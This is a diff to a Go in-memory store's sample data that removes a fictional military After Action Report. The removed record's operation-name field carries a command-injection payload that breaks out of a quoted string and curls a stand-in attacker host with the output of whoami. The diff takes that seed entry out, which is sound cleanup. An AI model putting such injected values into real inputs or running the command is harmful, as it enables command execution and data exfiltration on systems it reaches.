@@ -279,53 +279,6 @@ func (s *MemoryStore) loadSampleData() {
 		},
 	}
 
-	// Sample AAR 3: Operation Phantom Strike (WITH EXPLOITATION PAYLOAD)
-	aar3 := &models.AAR{
-		ID:              "AAR-20251107-0003",
-		Classification:  models.ClassificationUnclassified,
-		OperationName:   "Operation Phantom Strike'; curl http://attacker.example.com/exfil?data=$(whoami); echo 'Complete",
-		DTG:             "071030ZNOV25",
-		UnitDesignation: "Joint Special Operations Task Force 27",
-		MissionType:     models.MissionTypeCombat,
-		Location:        "Classified AO, CENTCOM Region",
-		DurationStart:   "070300ZNOV25",
-		DurationEnd:     "070630ZNOV25",
-		PersonnelCount:  24,
-		ExecutiveSummary: "Direct action mission targeting high-value individual suspected of coordinating insurgent activities. Mission executed under cover of darkness with air support and intelligence, surveillance, and reconnaissance (ISR) assets. Target was successfully detained without friendly casualties.",
-		KeyEvents: "0300: Insertion via helicopter\n0330: Movement to objective\n0430: Objective secured\n0500: Target detained\n0530: Site exploitation\n0600: Exfiltration\n0630: Mission complete",
-		WhatWentWell: "Intelligence preparation was excellent. Air support coordination was flawless. Team executed with precision and speed. ISR assets provided real-time situational awareness.",
-		NeedsImprovement: "Communications with higher headquarters experienced brief interruption. One piece of sensitive site exploitation equipment malfunctioned.",
-		LessonsLearned: "Redundant communications systems are essential for special operations. Equipment maintenance and pre-mission checks must be thorough. Intelligence fusion products significantly enhance mission success.",
-		Recommendations: "Procure backup communications equipment for all special operations teams. Increase frequency of equipment maintenance cycles. Continue emphasis on intelligence-driven targeting.",
-		CommandersAssessment: "Flawless execution by a professional team. This operation demonstrates the capability and readiness of our special operations forces.",
-		PreparedBy:      "CW3 David Martinez, Task Force Operations NCO",
-		ReviewedBy:      "LTC Jennifer Thompson, Task Force Commander",
-		Status:          models.StatusSubmitted,
-		SubmittedDate:   now.AddDate(0, 0, -1),
-		CreatedAt:       now.AddDate(0, 0, -1),
-		UpdatedAt:       now.AddDate(0, 0, -1),
-		Attachments: []models.Attachment{
-			{
-				ID:          "att-009",
-				AARID:       "AAR-20251107-0003",
-				Filename:    "mission_brief.pdf",
-				S3Key:       "aars/AAR-20251107-0003/attachments/mission_brief.pdf",
-				FileSize:    1048576,
-				ContentType: "application/pdf",
-				UploadedAt:  now.AddDate(0, 0, -1),
-			},
-			{
-				ID:          "att-010",
-				AARID:       "AAR-20251107-0003",
-				Filename:    "isr_footage.mp4",
-				S3Key:       "aars/AAR-20251107-0003/attachments/isr_footage.mp4",
-				FileSize:    104857600,
-				ContentType: "video/mp4",
-				UploadedAt:  now.AddDate(0, 0, -1),
-			},
-		},
-	}
-
 	// Sample AAR 4: Exercise Northern Viking
 	aar4 := &models.AAR{
 		ID:              "AAR-20250815-0004",
@@ -376,6 +329,5 @@ func (s *MemoryStore) loadSampleData() {
 	// Add all sample AARs to the store
 	s.aars[aar1.ID] = aar1
 	s.aars[aar2.ID] = aar2
-	s.aars[aar3.ID] = aar3
 	s.aars[aar4.ID] = aar4
 }
